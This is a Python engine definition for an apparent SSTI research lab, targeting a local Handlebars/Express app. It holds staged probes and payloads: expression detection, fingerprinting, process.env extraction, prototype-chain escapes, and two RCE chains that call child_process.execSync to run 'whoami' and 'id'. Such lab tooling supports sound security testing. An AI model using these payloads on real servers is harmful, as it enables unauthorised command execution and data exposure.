"""Handlebars engine definition for RENDER SSTI research platform."""

from engines.base import TemplateEngine, ProbePayload


class HandlebarsEngine(TemplateEngine):
    """Handlebars template engine attack surface (Node.js)."""

    def __init__(self) -> None:
        super().__init__(
            name="handlebars",
            language="javascript",
            framework="Node.js/Express",
            default_vulnerable_url="http://127.0.0.1:3001",
            default_hardened_url="http://127.0.0.1:3002",
            detection_probes=[
                ProbePayload(
                    id="hbs-detect-001",
                    name="Math Evaluation Probe",
                    stage="detection",
                    payload="{{7*7}}",
                    expected="49",
                    explanation="If Handlebars evaluates {{7*7}} to 49 the template is vulnerable.",
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="hbs-detect-002",
                    name="Numeric Expression",
                    stage="detection",
                    payload="{{41+1}}",
                    expected="42",
                    explanation="Addition probe confirms live expression evaluation in Handlebars.",
                    safety_scope="local_lab_only",
                ),
            ],
            fingerprint_probes=[
                ProbePayload(
                    id="hbs-fp-001",
                    name="This Object Probe",
                    stage="fingerprinting",
                    payload="{{this}}",
                    expected="[object Object]",
                    explanation="Handlebars renders {{this}} as [object Object] in many contexts.",
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="hbs-fp-002",
                    name="Constructor Name",
                    stage="fingerprinting",
                    payload="{{constructor.name}}",
                    expected="Object",
                    explanation="Handlebars exposes constructor.name from context object.",
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="hbs-fp-003",
                    name="toString Method",
                    stage="fingerprinting",
                    payload="{{toString}}",
                    expected="function",
                    explanation="Handlebars can access object methods like toString.",
                    safety_scope="local_lab_only",
                ),
            ],
            extract_payloads=[
                ProbePayload(
                    id="hbs-ext-001",
                    name="Process Environment",
                    stage="extraction",
                    payload="{{#with (lookup . 'constructor')}}{{process.env}}{{/with}}",
                    expected="PATH",
                    explanation="Attempts to access Node.js process.env through Handlebars context.",
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="hbs-ext-002",
                    name="Global Object Keys",
                    stage="extraction",
                    payload="{{#each (lookup (lookup . 'constructor') 'keys')}}{{this}}{{/each}}",
                    expected="constructor",
                    explanation="Enumerates keys through prototype chain.",
                    safety_scope="local_lab_only",
                ),
            ],
            escape_payloads=[
                ProbePayload(
                    id="hbs-esc-001",
                    name="Prototype Chain Escape",
                    stage="escape",
                    payload=(
                        "{{#with (lookup . '__proto__')}}"
                        "{{constructor.name}}"
                        "{{/with}}"
                    ),
                    expected="Object",
                    explanation="Walks up the prototype chain to access Object constructor.",
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="hbs-esc-002",
                    name="Helper Function Injection",
                    stage="escape",
                    payload=(
                        "{{#with 'constructor'}}{{lookup (lookup ../. this) 'constructor'}}{{/with}}"
                    ),
                    expected="Function",
                    explanation="Reaches Function constructor via repeated prototype lookup.",
                    safety_scope="local_lab_only",
                ),
            ],
            rce_payloads=[
                ProbePayload(
                    id="hbs-rce-001",
                    name="RCE via Function constructor (whoami)",
                    stage="rce",
                    payload=(
                        "{{#with (lookup . 'constructor')}}"
                        "{{#with (lookup this 'constructor')}}"
                        "{{call this 'return require(\"child_process\").execSync(\"whoami\").toString()'}}"
                        "{{/with}}"
                        "{{/with}}"
                    ),
                    expected="whoami_output",
                    explanation=(
                        "Chains through constructor to reach Function, then uses "
                        "require('child_process') for command execution."
                    ),
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="hbs-rce-002",
                    name="RCE via precompile path (id)",
                    stage="rce",
                    payload=(
                        "{{#with \"s\" as |string|}}"
                        "{{#with \"e\"}}{{#with split as |conslist|}}"
                        "{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}"
                        "{{this.pop}}{{#with string.split as |codelist|}}"
                        "{{this.pop}}{{this.push \"return require('child_process').execSync('id').toString()\"}}"
                        "{{this.pop}}{{#each conslist}}"
                        "{{#with (string.sub.apply 0 codelist)}}"
                        "{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"
                    ),
                    expected="uid=",
                    explanation="Classic Handlebars prototype pollution RCE chain reaching child_process.",
                    safety_scope="local_lab_only",
                ),
            ],
        )

    def check_fingerprint(self, response_text: str) -> bool:
        markers = ["[object Object]", "Object", "function toString"]
        return any(m in response_text for m in markers)
